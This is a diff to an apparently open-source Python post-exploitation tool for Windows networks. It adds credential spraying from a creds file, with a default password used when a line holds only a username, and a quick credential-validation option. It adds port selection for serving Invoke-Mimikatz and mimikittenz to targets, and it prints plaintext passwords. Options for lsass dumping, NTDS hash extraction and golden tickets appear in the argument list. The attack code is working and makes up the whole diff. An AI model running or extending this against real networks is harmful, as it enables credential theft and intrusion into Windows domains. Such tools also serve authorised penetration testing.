@@ -480,8 +480,16 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
 						exit(1)
 					print colored("[+]Looks good",'green')	
-					PORT = randint(49151,65535)
-										
+					
+					#Check to make sure port is not already in use
+					for i in xrange(10):
+						PORT = randint(49151,65535)					
+						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if len(stdout_value)>0:
+							break
+
+
 					my_ip=get_ip_address('eth0')
 					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
 					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
@@ -512,7 +520,7 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[+]Basic parsed output:",'green')
 							os.system("cat "+outputpath+host+"/creds1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 							print colored("[+]Mimikatz output stored in "+outputpath+host+"/creds1.txt",'yellow')
-							print colored("[+]Stoping web server",'green')
+							print colored("[+]Stopping web server",'green')
 							server_process.terminate()
 					else:
 						print colored("[-]creds1.txt file not found",'red')
@@ -527,7 +535,14 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[-]Cannot find Invoke-mimikittenz.ps1",'red')
 						exit(1)
 					print colored("[+]Looks good",'green')	
-					PORT = randint(49151,65535)
+					
+					#Check to make sure port is not already in use
+					for i in xrange(10):
+						PORT = randint(49151,65535)					
+						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if len(stdout_value)>0:
+							break
 										
 					my_ip=get_ip_address('eth0')
 					print colored("[+]Attempting to Run Mimikittenz",'green')
@@ -612,6 +627,9 @@ def checkport():
 		print colored("[+]Looks like a Domain Controller",'green')
 
 def run():
+	user=args.username
+	passw=args.password
+	
 	for target in targets:
 
 		host=str(target)
@@ -627,6 +645,10 @@ def run():
 		if nthash=='':
 			passwd=passw	
 
+		print 'User '+user
+		print 'Password '+passw
+		print 'Domain Name '+domain_name
+		
 		try: 
 
 			smbClient = SMBConnection(host, host, sess_port=int('445'),timeout=10) 
@@ -637,20 +659,22 @@ def run():
 				if smbClient.getServerOS().find('Windows')!=-1 and smbClient.isGuestSession() ==0:
 					print colored("[+]"+host+" responding to 445",'green')
 					
-					#Display Shares					
-					print colored("[+]"+host+" Enumerating Remote Shares",'green')
-					print colored("[+]"+host+" Shares Found",'yellow')
-					resp = smbClient.listShares()
-					for i in range(len(resp)):                        
-						print resp[i]['shi1_netname'][:-1]
+					if args.quick_validate in noanswers:
+						#Display Shares					
+						print colored("[+]"+host+" Enumerating Remote Shares",'green')
+						print colored("[+]"+host+" Shares Found",'yellow')
+						resp = smbClient.listShares()
+						for i in range(len(resp)):                        
+							print resp[i]['shi1_netname'][:-1]
 
-					t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
-					t.start()
-					t.join()
+						t = Thread(target=datadump, args=(user,passw,host,outputpath,smbClient.getServerOS()))
+						t.start()
+						t.join()
 				else:
 					print colored("[-]"+host+" not responding on port 445",'red')
 		except:
 			print colored("[-]"+host+" not responding on port 445",'red')
+
 
 def hashparse(hashfolder,hashfile):
 #Split hashes into NT and LM	
@@ -820,14 +844,16 @@ def main():
 					pwdump = pwdumpmatch.match(tmphash)
 					plaintextpassmatch = re.compile('^(\S+?)\s+(\S*?)$')
 					plain = plaintextpassmatch.match(tmphash)
+					usertextpassmatch = re.compile('^(\S+?)$')
+					username = usertextpassmatch.match(tmphash)
 					wcematch = re.compile('^(\S+?):.*?:([0-9a-fA-F]{32}):([0-9a-fA-F]{32})\s*$')
 					wce = wcematch.match(tmphash)
 					if pwdump:
 						try:
 							userhash = tmphash
 							splitter = userhash.split(":")
-							username=splitter[0]
-							passwd=splitter[2]+':'+splitter[3]+':::'
+							args.username=splitter[0]
+							args.password=splitter[2]+':'+splitter[3]+':::'
 							print colored('\n[+]Spraying...','yellow') 
 							run()
 						except:
@@ -836,8 +862,8 @@ def main():
 						try:
 							userhash = tmphash
 							splitter = userhash.split(":")
-							username=splitter[0]
-							passwd=splitter[2]
+							args.username=splitter[0]
+							args.password=splitter[2]
 							print colored('\n[+]Spraying...','yellow') 
 							run()
 						except:
@@ -846,12 +872,29 @@ def main():
 						try:
 							userhash = tmphash
 							splitter = userhash.split(" ")
-							username=splitter[0]
-							passwd=splitter[1]
+
+							if len(splitter)==2:
+								args.username=splitter[0]
+								args.password=splitter[1]
+							
 							print colored('\n[+]Spraying...','yellow') 
 							run()
 						except:
 								print colored("[-]Credentials Error",'red')
+					if username:
+						try:
+							userhash = tmphash
+							splitter = userhash.split(" ")
+							
+							if len(splitter)==1:
+								args.username=splitter[0]
+								
+								args.password=args.pass_on_blank
+							
+							print colored('\n[+]Spraying...','yellow') 
+							run()
+						except:
+							print colored("[-]Credentials Error",'red')
 	else:
 		run()
 	if len(targets)>1:
@@ -890,6 +933,7 @@ p.add_argument("-u", "--username", dest="username", default="Administrator",help
 p.add_argument("-p", "--password", dest="password", default="Password1", help="Enter a password or hash")
 p.add_argument("-d", "--domain_name", dest="domain_name", default=".", help="<Optional> Enter domain name")
 # Configurational 
+p.add_argument("-cQ", "--quick_validate", dest="quick_validate", default="n", help="<Optional> Quickly Validate Credentials")
 p.add_argument("-cC", "--credpath", dest="credpath", default="/opt/creddump7/", help="<Optional> Enter path to creddump7 default /opt/creddump7/")
 p.add_argument("-cO", "--outputpath", dest="outputpath", default="/tmp/", help="<Optional> Enter output path default /tmp/")
 p.add_argument("-cM", "--mergepf", dest="mergepf", default="/tmp/merged.txt", help="<Optional> Enter output path and filename to merge multiple pwdump files default /tmp/merged.txt")
@@ -905,11 +949,13 @@ p.add_argument("-hN", "--ntds_util", dest="ntds_util", default="", help="<Option
 p.add_argument("-hI", "--drsuapi", dest="drsuapi", default="", help="<Optional> Extract NTDS.dit hashes using drsuapi method - accepts machine name as username")
 p.add_argument("-hQ", "--qldap", dest="qldap", default="", help="<Optional> In conjunction with the -i and -n option - Query LDAP for Account Status when dumping Domain Hashes")
 p.add_argument("-hS", "--credsfile", dest="credsfile", default="", help="Spray multiple hashes at a target range")
+p.add_argument("-hP", "--pass_on_blank", dest="pass_on_blank", default="Password1", help="Password to use when only username found in Creds File")
 p.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<Optional> Run Mimikittenz")
 p.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
 p.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
 p.add_argument("-hR", "--stealth_mimi", dest="stealth_mimi", default="n", help="<Optional> stealth version of mass-mimikatz")
 p.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
+
 # Enumeration related
 p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
 p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
